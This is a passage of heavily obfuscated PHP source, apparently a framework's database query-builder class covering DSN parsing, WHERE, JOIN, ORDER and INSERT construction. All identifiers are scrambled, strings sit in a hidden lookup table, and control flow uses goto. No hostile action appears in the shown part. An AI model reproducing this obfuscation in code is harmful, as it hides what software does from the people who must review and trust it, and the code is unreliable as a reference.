$AŸôø¥¨Ş) { $CÌÓÊãÊˆÓ[$fëâ£ÓÜ„¤] = explode($e±¥ˆç¼¯ù[47], $AŸôø¥¨Ş); } } if (think_config($e±¥ˆç¼¯ù[898])) { if ($c—ƒ¢Úñ¬Ø) { $c‹»Ô©øø‰ = floor(mt_rand(0, think_config($e±¥ˆç¼¯ù[899]) - 1)); } else { if (is_numeric(think_config($e±¥ˆç¼¯ù[900]))) { $c‹»Ô©øø‰ = think_config($e±¥ˆç¼¯ù[900]); } else { $c‹»Ô©øø‰ = floor(mt_rand(think_config($e±¥ˆç¼¯ù[899]), count($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[803]]) - 1)); } } } else { $c‹»Ô©øø‰ = floor(mt_rand(0, count($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[803]]) - 1)); } $f¿¿Äé©ãé = array($e±¥ˆç¼¯ù[805] => isset($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[805]][$c‹»Ô©øø‰]) ? $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[805]][$c‹»Ô©øø‰] : $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[805]][0], $e±¥ˆç¼¯ù[806] => isset($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[806]][$c‹»Ô©øø‰]) ? $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[806]][$c‹»Ô©øø‰] : $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[806]][0], $e±¥ˆç¼¯ù[803] => isset($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[803]][$c‹»Ô©øø‰]) ? $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[803]][$c‹»Ô©øø‰] : $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[803]][0], $e±¥ˆç¼¯ù[804] => isset($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[804]][$c‹»Ô©øø‰]) ? $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[804]][$c‹»Ô©øø‰] : $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[804]][0], $e±¥ˆç¼¯ù[17] => isset($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[17]][$c‹»Ô©øø‰]) ? $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[17]][$c‹»Ô©øø‰] : $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[17]][0], $e±¥ˆç¼¯ù[832] => isset($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[832]][$c‹»Ô©øø‰]) ? $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[832]][$c‹»Ô©øø‰] : $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[832]][0], $e±¥ˆç¼¯ù[13] => isset($CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[13]][$c‹»Ô©øø‰]) ? $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[13]][$c‹»Ô©øø‰] : $CÌÓÊãÊˆÓ[$e±¥ˆç¼¯ù[13]][0]); return $this->connect($f¿¿Äé©ãé, $c‹»Ô©øø‰); } public function parseDSN($d¾½Ê¢œáä) { $E„ÜëÚ¸ĞŸ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($d¾½Ê¢œáä)) { return !1; } $C—„‡××‡ = parse_url($d¾½Ê¢œáä); if ($C—„‡××‡[$E„ÜëÚ¸ĞŸ[168]]) { $DšòƒŒ¿¯ë = array($E„ÜëÚ¸ĞŸ[880] => $C—„‡××‡[$E„ÜëÚ¸ĞŸ[168]], $E„ÜëÚ¸ĞŸ[805] => isset($C—„‡××‡[$E„ÜëÚ¸ĞŸ[535]]) ? $C—„‡××‡[$E„ÜëÚ¸ĞŸ[535]] : $E„ÜëÚ¸ĞŸ[33], $E„ÜëÚ¸ĞŸ[806] => isset($C—„‡××‡[$E„ÜëÚ¸ĞŸ[901]]) ? $C—„‡××‡[$E„ÜëÚ¸ĞŸ[901]] : $E„ÜëÚ¸ĞŸ[33], $E„ÜëÚ¸ĞŸ[803] => isset($C—„‡××‡[$E„ÜëÚ¸ĞŸ[169]]) ? $C—„‡××‡[$E„ÜëÚ¸ĞŸ[169]] : $E„ÜëÚ¸ĞŸ[33], $E„ÜëÚ¸ĞŸ[804] => isset($C—„‡××‡[$E„ÜëÚ¸ĞŸ[170]]) ? $C—„‡××‡[$E„ÜëÚ¸ĞŸ[170]] : $E„ÜëÚ¸ĞŸ[33], $E„ÜëÚ¸ĞŸ[17] => isset($C—„‡××‡[$E„ÜëÚ¸ĞŸ[75]]) ? substr($C—„‡××‡[$E„ÜëÚ¸ĞŸ[75]], 1) : $E„ÜëÚ¸ĞŸ[33]); } else { preg_match($E„ÜëÚ¸ĞŸ[902], trim($d¾½Ê¢œáä), $añ ê¹¹); $DšòƒŒ¿¯ë = array($E„ÜëÚ¸ĞŸ[880] => $añ ê¹¹[1], $E„ÜëÚ¸ĞŸ[805] => $añ ê¹¹[2], $E„ÜëÚ¸ĞŸ[806] => $añ ê¹¹[3], $E„ÜëÚ¸ĞŸ[803] => $añ ê¹¹[4], $E„ÜëÚ¸ĞŸ[804] => $añ ê¹¹[5], $E„ÜëÚ¸ĞŸ[17] => $añ ê¹¹[6]); } $DšòƒŒ¿¯ë[$E„ÜëÚ¸ĞŸ[832]] = $E„ÜëÚ¸ĞŸ[33]; return $DšòƒŒ¿¯ë; } protected function debug() { $BÜæáäˆ«ø =& $_SERVER[³‘’¼äÑ™ÔÍ]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $BÜæáäˆ«ø[903]; if (think_config($BÜæáäˆ«ø[904])) { think_status($BÜæáäˆ«ø[905]); think_trace($this->queryStr . $BÜæáäˆ«ø[906] . think_status($BÜæáäˆ«ø[20], $BÜæáäˆ«ø[905], 6) . $BÜæáäˆ«ø[907], $BÜæáäˆ«ø[33], $BÜæáäˆ«ø[908]); } } protected function parseLock($FÔçŸ½èÕ = false) { $C¿Çõ»œÕ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (!$FÔçŸ½èÕ) { return $C¿Çõ»œÕ[33]; } if ($C¿Çõ»œÕ[834] == $this->dbType) { return $C¿Çõ»œÕ[909]; } return $C¿Çõ»œÕ[910]; } protected function parseSet($c´¡İÍª­ñ) { $E›ºĞ®‘®— =& $_SERVER[³‘’¼äÑ™ÔÍ]; foreach ($c´¡İÍª­ñ as $C¼‹‘Ÿ¸™ => $c·Æ¯²•Ì) { if (is_array($c·Æ¯²•Ì) && $E›ºĞ®‘®—[285] == $c·Æ¯²•Ì[0]) { $aÍ¹çÕáğ[] = $this->parseKey($C¼‹‘Ÿ¸™) . $E›ºĞ®‘®—[911] . $c·Æ¯²•Ì[1]; } elseif (is_scalar($c·Æ¯²•Ì) || is_null($c·Æ¯²•Ì)) { $aÍ¹çÕáğ[] = $this->parseKey($C¼‹‘Ÿ¸™) . $E›ºĞ®‘®—[911] . $this->parseValue($c·Æ¯²•Ì); } } return $E›ºĞ®‘®—[912] . implode($E›ºĞ®‘®—[47], $aÍ¹çÕáğ); } protected function bindParam($A³øä©¼ˆ÷, $A˜¨Á™òÊí) { $this->bind[$_SERVER[³‘’¼äÑ™ÔÍ][4] . $A³øä©¼ˆ÷] = $A˜¨Á™òÊí; } protected function parseBind($a÷‡×ğñÖ) { $a÷‡×ğñÖ = array_merge($this->bind, $a÷‡×ğñÖ); $this->bind = array(); return $a÷‡×ğñÖ; } function parseKey(&$aïÕºçÆ©, $Cí¦ø¹ãø = true) { if ($Cí¦ø¹ãø) { $aïÕºçÆ© = $this->parseKeyCheck($aïÕºçÆ©); } return $aïÕºçÆ©; } function parseKeyCheck($FóÃÍÅ¹™¬) { $fÙï±ÆÃ”÷ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $FóÃÍÅ¹™¬ = trim($FóÃÍÅ¹™¬); if (!preg_match($fÙï±ÆÃ”÷[913], $FóÃÍÅ¹™¬)) { think_exception($fÙï±ÆÃ”÷[914] . $FóÃÍÅ¹™¬); } return $FóÃÍÅ¹™¬; } protected function parseValue($fƒâÔ‰´ÁĞ) { $cÂˆ†–‰İî =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_string($fƒâÔ‰´ÁĞ)) { $fƒâÔ‰´ÁĞ = $cÂˆ†–‰İî[873] . $this->escapeString($fƒâÔ‰´ÁĞ) . $cÂˆ†–‰İî[873]; } elseif (isset($fƒâÔ‰´ÁĞ[0]) && is_string($fƒâÔ‰´ÁĞ[0]) && strtolower($fƒâÔ‰´ÁĞ[0]) == $cÂˆ†–‰İî[285]) { $fƒâÔ‰´ÁĞ = $this->escapeString($fƒâÔ‰´ÁĞ[1]); } elseif (is_array($fƒâÔ‰´ÁĞ)) { $fƒâÔ‰´ÁĞ = array_map(array($this, $cÂˆ†–‰İî[874]), $fƒâÔ‰´ÁĞ); } elseif (is_bool($fƒâÔ‰´ÁĞ)) { $fƒâÔ‰´ÁĞ = $fƒâÔ‰´ÁĞ ? $cÂˆ†–‰İî[83] : $cÂˆ†–‰İî[468]; } elseif (is_null($fƒâÔ‰´ÁĞ)) { $fƒâÔ‰´ÁĞ = $cÂˆ†–‰İî[99]; } return $fƒâÔ‰´ÁĞ; } protected function parseField($f§¬ñİ°Í) { $Cõ„à¡Ü‡† =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_string($f§¬ñİ°Í) && strpos($f§¬ñİ°Í, $Cõ„à¡Ü‡†[47])) { $f§¬ñİ°Í = explode($Cõ„à¡Ü‡†[47], $f§¬ñİ°Í); } if (is_array($f§¬ñİ°Í)) { $eòË‡‚ãª = array(); foreach ($f§¬ñİ°Í as $cÉÂ‰ïñ => $c”Ş‚Å¯½Ê) { if (!is_numeric($cÉÂ‰ïñ)) { $eòË‡‚ãª[] = $this->parseKey($cÉÂ‰ïñ) . $Cõ„à¡Ü‡†[915] . $this->parseKey($c”Ş‚Å¯½Ê); } else { $eòË‡‚ãª[] = $this->parseKey($c”Ş‚Å¯½Ê); } } $CÄùÅ”±©¶ = implode($Cõ„à¡Ü‡†[47], $eòË‡‚ãª); } elseif (is_string($f§¬ñİ°Í) && !empty($f§¬ñİ°Í)) { $CÄùÅ”±©¶ = $f§¬ñİ°Í; } else { $CÄùÅ”±©¶ = $Cõ„à¡Ü‡†[176]; } return $CÄùÅ”±©¶; } protected function parseTable($Aæ§Ñá’»â) { $F©Ğ¬öŒ‡ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_array($Aæ§Ñá’»â)) { $CÀ„ÈÁñ„° = array(); foreach ($Aæ§Ñá’»â as $bÊ¾—§² => $f™”®ÎĞ³) { if (!is_numeric($bÊ¾—§²)) { $CÀ„ÈÁñ„°[] = $this->parseKey($bÊ¾—§²) . $F©Ğ¬öŒ‡[50] . $this->parseKey($f™”®ÎĞ³); } else { $CÀ„ÈÁñ„°[] = $this->parseKey($bÊ¾—§²); } } $Aæ§Ñá’»â = $CÀ„ÈÁñ„°; } elseif (is_string($Aæ§Ñá’»â)) { if (strstr($Aæ§Ñá’»â, $F©Ğ¬öŒ‡[50])) { return $Aæ§Ñá’»â; } $Aæ§Ñá’»â = explode($F©Ğ¬öŒ‡[47], $Aæ§Ñá’»â); array_walk($Aæ§Ñá’»â, array($this, $F©Ğ¬öŒ‡[822])); } return $F©Ğ¬öŒ‡[916] . trim(implode($F©Ğ¬öŒ‡[917], $Aæ§Ñá’»â), $F©Ğ¬öŒ‡[828]) . $F©Ğ¬öŒ‡[916]; } protected function parseWhere($bäõ°ÒÔ„¼) { $D±ø¶É£ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $A‹Í¤è¼†ß = $D±ø¶É£[33]; if (is_string($bäõ°ÒÔ„¼)) { $A‹Í¤è¼†ß = $bäõ°ÒÔ„¼; } else { $fŸ«´‡¾èÖ = isset($bäõ°ÒÔ„¼[$D±ø¶É£[918]]) ? strtoupper($bäõ°ÒÔ„¼[$D±ø¶É£[918]]) : $D±ø¶É£[33]; if (in_array($fŸ«´‡¾èÖ, array($D±ø¶É£[919], $D±ø¶É£[920], $D±ø¶É£[921]))) { $fŸ«´‡¾èÖ = $D±ø¶É£[50] . $fŸ«´‡¾èÖ . $D±ø¶É£[50]; unset($bäõ°ÒÔ„¼[$D±ø¶É£[918]]); } else { $fŸ«´‡¾èÖ = $D±ø¶É£[922]; } foreach ($bäõ°ÒÔ„¼ as $d Ö³¶©”À => $båô…ÈÅ‘ø) { $A‹Í¤è¼†ß .= $D±ø¶É£[265]; if (is_numeric($d Ö³¶©”À)) { $d Ö³¶©”À = $D±ø¶É£[923]; } if (0 === strpos($d Ö³¶©”À, $D±ø¶É£[70])) { $A‹Í¤è¼†ß .= $this->parseThinkWhere($d Ö³¶©”À, $båô…ÈÅ‘ø); } else { if (!preg_match($D±ø¶É£[924], trim($d Ö³¶©”À))) { think_exception(think_lang($D±ø¶É£[925]) . $D±ø¶É£[4] . $d Ö³¶©”À); } $cÂ‘Ø÷«îé = is_array($båô…ÈÅ‘ø) && isset($båô…ÈÅ‘ø[$D±ø¶É£[926]]); $d Ö³¶©”À = trim($d Ö³¶©”À); if (strpos($d Ö³¶©”À, $D±ø¶É£[271])) { $aÔ¹ô´„íå = explode($D±ø¶É£[271], $d Ö³¶©”À); $Bæ­§åˆ… = array(); foreach ($aÔ¹ô´„íå as $fº‹Ÿ†è => $FÂ‰œ““ïÏ) { $dâÖÕõµˆ¸ = $cÂ‘Ø÷«îé ? $båô…ÈÅ‘ø[$fº‹Ÿ†è] : $båô…ÈÅ‘ø; $Bæ­§åˆ…[] = $D±ø¶É£[248] . $this->parseWhereItem($this->parseKey($FÂ‰œ““ïÏ), $dâÖÕõµˆ¸) . $D±ø¶É£[821]; } $A‹Í¤è¼†ß .= implode($D±ø¶É£[927], $Bæ­§åˆ…); } elseif (strpos($d Ö³¶©”À, $D±ø¶É£[272])) { $aÔ¹ô´„íå = explode($D±ø¶É£[272], $d Ö³¶©”À); $Bæ­§åˆ… = array(); foreach ($aÔ¹ô´„íå as $fº‹Ÿ†è => $FÂ‰œ““ïÏ) { $dâÖÕõµˆ¸ = $cÂ‘Ø÷«îé ? $båô…ÈÅ‘ø[$fº‹Ÿ†è] : $båô…ÈÅ‘ø; $Bæ­§åˆ…[] = $D±ø¶É£[248] . $this->parseWhereItem($this->parseKey($FÂ‰œ““ïÏ), $dâÖÕõµˆ¸) . $D±ø¶É£[821]; } $A‹Í¤è¼†ß .= implode($D±ø¶É£[922], $Bæ­§åˆ…); } else { $A‹Í¤è¼†ß .= $this->parseWhereItem($this->parseKey($d Ö³¶©”À), $båô…ÈÅ‘ø); } } $A‹Í¤è¼†ß .= $D±ø¶É£[266] . $fŸ«´‡¾èÖ; } $A‹Í¤è¼†ß = substr($A‹Í¤è¼†ß, 0, -strlen($fŸ«´‡¾èÖ)); } return empty($A‹Í¤è¼†ß) ? $D±ø¶É£[33] : $D±ø¶É£[928] . $A‹Í¤è¼†ß; } protected function parseWhereItem($E¥÷–¯ì¹õ, $b¿³‹àåº—) { $b‚Å¦Ğ‚ØÁ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $D‘¶–‘—äÓ = $b‚Å¦Ğ‚ØÁ[33]; if (is_array($b¿³‹àåº—)) { if (is_string($b¿³‹àåº—[0])) { $C·Ş©ÎöØë = strtolower($b¿³‹àåº—[0]); if (in_array($b¿³‹àåº—[0], array($b‚Å¦Ğ‚ØÁ[911], $b‚Å¦Ğ‚ØÁ[929], $b‚Å¦Ğ‚ØÁ[930], $b‚Å¦Ğ‚ØÁ[931], $b‚Å¦Ğ‚ØÁ[932], $b‚Å¦Ğ‚ØÁ[933]))) { $D‘¶–‘—äÓ .= $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $b¿³‹àåº—[0] . $b‚Å¦Ğ‚ØÁ[50] . $this->parseValue($b¿³‹àåº—[1]); } elseif (preg_match($b‚Å¦Ğ‚ØÁ[934], $b¿³‹àåº—[0])) { $D‘¶–‘—äÓ .= $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $this->exp[$C·Ş©ÎöØë] . $b‚Å¦Ğ‚ØÁ[50] . $this->parseValue($b¿³‹àåº—[1]); } elseif (preg_match($b‚Å¦Ğ‚ØÁ[935], $b¿³‹àåº—[0])) { if (is_array($b¿³‹àåº—[1])) { $càÙ§¨á¶ = isset($b¿³‹àåº—[2]) ? strtoupper($b¿³‹àåº—[2]) : $b‚Å¦Ğ‚ØÁ[920]; if (in_array($càÙ§¨á¶, array($b‚Å¦Ğ‚ØÁ[919], $b‚Å¦Ğ‚ØÁ[920], $b‚Å¦Ğ‚ØÁ[921]))) { $C«ŸöîäÎ‘ = array(); foreach ($b¿³‹àåº—[1] as $A¼»Á—¼„Ø) { $C«ŸöîäÎ‘[] = $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $this->exp[$C·Ş©ÎöØë] . $b‚Å¦Ğ‚ØÁ[50] . $this->parseValue($A¼»Á—¼„Ø); } $D‘¶–‘—äÓ .= $b‚Å¦Ğ‚ØÁ[248] . implode($b‚Å¦Ğ‚ØÁ[50] . $càÙ§¨á¶ . $b‚Å¦Ğ‚ØÁ[50], $C«ŸöîäÎ‘) . $b‚Å¦Ğ‚ØÁ[821]; } } else { $D‘¶–‘—äÓ .= $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $this->exp[$C·Ş©ÎöØë] . $b‚Å¦Ğ‚ØÁ[50] . $this->parseValue($b¿³‹àåº—[1]); } } elseif ($b‚Å¦Ğ‚ØÁ[285] == $C·Ş©ÎöØë) { $D‘¶–‘—äÓ .= $b‚Å¦Ğ‚ØÁ[819] . $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $b¿³‹àåº—[1] . $b‚Å¦Ğ‚ØÁ[936]; } elseif (preg_match($b‚Å¦Ğ‚ØÁ[937], $b¿³‹àåº—[0])) { if (isset($b¿³‹àåº—[2]) && $b‚Å¦Ğ‚ØÁ[285] == $b¿³‹àåº—[2]) { $D‘¶–‘—äÓ .= $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $this->exp[$C·Ş©ÎöØë] . $b‚Å¦Ğ‚ØÁ[50] . $b¿³‹àåº—[1]; } else { if (is_string($b¿³‹àåº—[1])) { $b¿³‹àåº—[1] = explode($b‚Å¦Ğ‚ØÁ[47], $b¿³‹àåº—[1]); } $C¯Ò¤­Ô° = implode($b‚Å¦Ğ‚ØÁ[47], $this->parseValue($b¿³‹àåº—[1])); $D‘¶–‘—äÓ .= $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $this->exp[$C·Ş©ÎöØë] . $b‚Å¦Ğ‚ØÁ[819] . $C¯Ò¤­Ô° . $b‚Å¦Ğ‚ØÁ[821]; } } elseif (preg_match($b‚Å¦Ğ‚ØÁ[938], $b¿³‹àåº—[0])) { $b—• ËåÙë = is_string($b¿³‹àåº—[1]) ? explode($b‚Å¦Ğ‚ØÁ[47], $b¿³‹àåº—[1]) : $b¿³‹àåº—[1]; $D‘¶–‘—äÓ .= $b‚Å¦Ğ‚ØÁ[819] . $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $this->exp[$C·Ş©ÎöØë] . $b‚Å¦Ğ‚ØÁ[50] . $this->parseValue($b—• ËåÙë[0]) . $b‚Å¦Ğ‚ØÁ[922] . $this->parseValue($b—• ËåÙë[1]) . $b‚Å¦Ğ‚ØÁ[266]; } else { think_exception(think_lang($b‚Å¦Ğ‚ØÁ[925]) . $b‚Å¦Ğ‚ØÁ[4] . $b¿³‹àåº—[0]); } } else { $fÂ¦‡õîùÒ = count($b¿³‹àåº—); $AÛ‡ëˆ±‡› = isset($b¿³‹àåº—[$fÂ¦‡õîùÒ - 1]) ? strtoupper($b¿³‹àåº—[$fÂ¦‡õîùÒ - 1]) : $b‚Å¦Ğ‚ØÁ[33]; if (in_array($AÛ‡ëˆ±‡›, array($b‚Å¦Ğ‚ØÁ[919], $b‚Å¦Ğ‚ØÁ[920], $b‚Å¦Ğ‚ØÁ[921]))) { $fÂ¦‡õîùÒ = $fÂ¦‡õîùÒ - 1; } else { $AÛ‡ëˆ±‡› = $b‚Å¦Ğ‚ØÁ[919]; } for ($dºïÑà†† = 0; $dºïÑà†† < $fÂ¦‡õîùÒ; $dºïÑà††++) { $b—• ËåÙë = is_array($b¿³‹àåº—[$dºïÑà††]) ? $b¿³‹àåº—[$dºïÑà††][1] : $b¿³‹àåº—[$dºïÑà††]; if ($b‚Å¦Ğ‚ØÁ[285] == strtolower($b¿³‹àåº—[$dºïÑà††][0])) { $D‘¶–‘—äÓ .= $b‚Å¦Ğ‚ØÁ[248] . $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $b—• ËåÙë . $b‚Å¦Ğ‚ØÁ[936] . $AÛ‡ëˆ±‡› . $b‚Å¦Ğ‚ØÁ[50]; } else { $Cªä…ä¦© = is_array($b¿³‹àåº—[$dºïÑà††]) ? $this->exp[strtolower($b¿³‹àåº—[$dºïÑà††][0])] : $b‚Å¦Ğ‚ØÁ[911]; if (!$Cªä…ä¦© && is_array($b¿³‹àåº—[$dºïÑà††]) && in_array($b¿³‹àåº—[$dºïÑà††][0], array($b‚Å¦Ğ‚ØÁ[911], $b‚Å¦Ğ‚ØÁ[929], $b‚Å¦Ğ‚ØÁ[930], $b‚Å¦Ğ‚ØÁ[931], $b‚Å¦Ğ‚ØÁ[932], $b‚Å¦Ğ‚ØÁ[933]))) { $Cªä…ä¦© = $b¿³‹àåº—[$dºïÑà††][0]; } $D‘¶–‘—äÓ .= $b‚Å¦Ğ‚ØÁ[248] . $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[50] . $Cªä…ä¦© . $b‚Å¦Ğ‚ØÁ[50] . $this->parseValue($b—• ËåÙë) . $b‚Å¦Ğ‚ØÁ[936] . $AÛ‡ëˆ±‡› . $b‚Å¦Ğ‚ØÁ[50]; } } $D‘¶–‘—äÓ = substr($D‘¶–‘—äÓ, 0, -4); } } else { $D‘¶–‘—äÓ .= $E¥÷–¯ì¹õ . $b‚Å¦Ğ‚ØÁ[939] . $this->parseValue($b¿³‹àåº—); } return $D‘¶–‘—äÓ; } protected function parseThinkWhere($eÜ¤É¢”¾ , $cÓåºÇÜŸè) { $EŞÚÒ ÷‰æ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $c•µóÈÍŠ½ = $EŞÚÒ ÷‰æ[33]; switch ($eÜ¤É¢”¾ ) { case $EŞÚÒ ÷‰æ[339]: $c•µóÈÍŠ½ = $cÓåºÇÜŸè; break; case $EŞÚÒ ÷‰æ[923]: $c•µóÈÍŠ½ = is_string($cÓåºÇÜŸè) ? $cÓåºÇÜŸè : substr($this->parseWhere($cÓåºÇÜŸè), 6); break; case $EŞÚÒ ÷‰æ[940]: parse_str($cÓåºÇÜŸè, $eè×¶¨ñ´¯); if (isset($eè×¶¨ñ´¯[$EŞÚÒ ÷‰æ[918]])) { $cĞËÇ‰ùš = $EŞÚÒ ÷‰æ[50] . strtoupper($eè×¶¨ñ´¯[$EŞÚÒ ÷‰æ[918]]) . $EŞÚÒ ÷‰æ[50]; unset($eè×¶¨ñ´¯[$EŞÚÒ ÷‰æ[918]]); } else { $cĞËÇ‰ùš = $EŞÚÒ ÷‰æ[922]; } $cÃø¸Ò·†á = array(); foreach ($eè×¶¨ñ´¯ as $a‘¶Òî®íÁ => $cçÎ¨ÂÅíË) { $cÃø¸Ò·†á[] = $this->parseKey($a‘¶Òî®íÁ) . $EŞÚÒ ÷‰æ[939] . $this->parseValue($cçÎ¨ÂÅíË); } $c•µóÈÍŠ½ = implode($cĞËÇ‰ùš, $cÃø¸Ò·†á); break; } return $c•µóÈÍŠ½; } protected function parseLimit($EÁœ“Ÿ÷Ì) { $fË°ŞŒ˜Ã‹ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return !empty($EÁœ“Ÿ÷Ì) ? $fË°ŞŒ˜Ã‹[48] . $EÁœ“Ÿ÷Ì . $fË°ŞŒ˜Ã‹[50] : $fË°ŞŒ˜Ã‹[33]; } protected function parseJoin($fêÀ›ÉÇ½â) { $FÁö½ =& $_SERVER[³‘’¼äÑ™ÔÍ]; $e§„ÇâÑ® = $FÁö½[33]; if (!empty($fêÀ›ÉÇ½â)) { if (is_array($fêÀ›ÉÇ½â)) { foreach ($fêÀ›ÉÇ½â as $dõøÕ©÷¯Ï => $a”š¢ÑŒºµ) { if (!1 !== stripos($a”š¢ÑŒºµ, $FÁö½[941])) { $e§„ÇâÑ® .= $FÁö½[50] . $a”š¢ÑŒºµ; } else { $e§„ÇâÑ® .= $FÁö½[942] . $a”š¢ÑŒºµ; } } } else { $e§„ÇâÑ® .= $FÁö½[942] . $fêÀ›ÉÇ½â; } } $e§„ÇâÑ® = preg_replace($FÁö½[943], think_config($FÁö½[846]) . $FÁö½[944], $e§„ÇâÑ®); return $e§„ÇâÑ®; } protected function parseOrder($e¦œ¥Ûì§Œ) { $D¹ìŒ—ĞŸÔ =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (is_array($e¦œ¥Ûì§Œ)) { $Dß„éÀ™ = array(); foreach ($e¦œ¥Ûì§Œ as $A…Ü“òÈ’õ => $E• Ç½¢‰Û) { if (is_numeric($A…Ü“òÈ’õ)) { $Dß„éÀ™[] = $this->parseKey($E• Ç½¢‰Û); } else { $E• Ç½¢‰Û = in_array(strtoupper(trim($E• Ç½¢‰Û)), array($D¹ìŒ—ĞŸÔ[945], $D¹ìŒ—ĞŸÔ[946])) ? $D¹ìŒ—ĞŸÔ[50] . $E• Ç½¢‰Û : $D¹ìŒ—ĞŸÔ[33]; if (preg_match($D¹ìŒ—ĞŸÔ[947], $A…Ü“òÈ’õ)) { $Dß„éÀ™[] = $this->parseKey($A…Ü“òÈ’õ) . $E• Ç½¢‰Û; } else { think_exception($D¹ìŒ—ĞŸÔ[948] . $A…Ü“òÈ’õ); } } } $e¦œ¥Ûì§Œ = implode($D¹ìŒ—ĞŸÔ[47], $Dß„éÀ™); } return !empty($e¦œ¥Ûì§Œ) ? $D¹ìŒ—ĞŸÔ[949] . $e¦œ¥Ûì§Œ : $D¹ìŒ—ĞŸÔ[33]; } protected function parseGroup($F•áÅÆ´©Ì) { $Fòóˆ¶µìŞ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return !empty($F•áÅÆ´©Ì) ? $Fòóˆ¶µìŞ[950] . $F•áÅÆ´©Ì : $Fòóˆ¶µìŞ[33]; } protected function parseHaving($AšâøÇó‹¶) { $B‹•ŸØ¬ğ¤ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return !empty($AšâøÇó‹¶) ? $B‹•ŸØ¬ğ¤[951] . $AšâøÇó‹¶ : $B‹•ŸØ¬ğ¤[33]; } protected function parseComment($Aí×³òæˆ) { $EÙÅÙ©¦šˆ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return !empty($Aí×³òæˆ) ? $EÙÅÙ©¦šˆ[952] . $Aí×³òæˆ . $EÙÅÙ©¦šˆ[953] : $EÙÅÙ©¦šˆ[33]; } protected function parseDistinct($CŒÔâñÚ’¤) { $AÛÌ”ÏÑñ =& $_SERVER[³‘’¼äÑ™ÔÍ]; return !empty($CŒÔâñÚ’¤) ? $AÛÌ”ÏÑñ[954] : $AÛÌ”ÏÑñ[33]; } protected function parseUnion($EÖËƒ¢Æß) { $c À™îÉ†ï =& $_SERVER[³‘’¼äÑ™ÔÍ]; if (empty($EÖËƒ¢Æß)) { return $c À™îÉ†ï[33]; } if (isset($EÖËƒ¢Æß[$c À™îÉ†ï[336]])) { $E¬”ÔŸÖÆŠ = $c À™îÉ†ï[955]; unset($EÖËƒ¢Æß[$c À™îÉ†ï[336]]); } else { $E¬”ÔŸÖÆŠ = $c À™îÉ†ï[956]; } foreach ($EÖËƒ¢Æß as $fíÀ¼æÅœ) { $c‰çöä©Ì[] = $E¬”ÔŸÖÆŠ . (is_array($fíÀ¼æÅœ) ? $this->buildSelectSql($fíÀ¼æÅœ) : $fíÀ¼æÅœ); } return implode($c À™îÉ†ï[50], $c‰çöä©Ì); } public function insert($e÷ŒÌÅßµ…, $AĞºäßÑ³ = array(), $f×Û·ÊÇÙ = false) { goto AáÄ‘µÌ; dñÔæ›¥•à: foreach ($e÷ŒÌÅßµ… as $B–¦Œ†‹ê… => $dÎßäìÆÅÈ) { if (is_array($dÎßäìÆÅÈ) && $Aè½ğß††Ñ[285] == $dÎßäìÆÅÈ[0]) { $dğŠÄ¾™Á—[] = $this->parseKey($B–¦Œ†‹ê…); $a­¦õÓ˜§[] = $dÎßäìÆÅÈ[1]; } elseif (is_scalar($dÎßäìÆÅÈ) || is_null($dÎßäìÆÅÈ)) { $dğŠÄ¾™Á—[] = $this->parseKey($B–¦Œ†‹ê…); $a­¦õÓ˜§[] = $this->parseValue($dÎßäìÆÅÈ); } } $DÆÙ«ä­˜õ = ($f×Û·ÊÇÙ ? $Aè½ğß††Ñ[823] : $Aè½ğß††Ñ[824]) . $Aè½ğß††Ñ[825] . $this->parseTable($AĞºäßÑ³[$Aè½ğß††Ñ[267]]) . $Aè½ğß††Ñ[819] . implode($Aè½ğß††Ñ[47], $dğŠÄ¾™Á—) . $Aè½ğß††Ñ[820] . implode($Aè½ğß††Ñ[47], $a­¦õÓ˜§) . $Aè½ğß††Ñ[821]; $DÆÙ«ä­˜õ .= $this->parseLock(isset($AĞºäßÑ³[$Aè½ğß††Ñ[775]]) ? $AĞºäßÑ³[$Aè½ğß††Ñ[775]] : 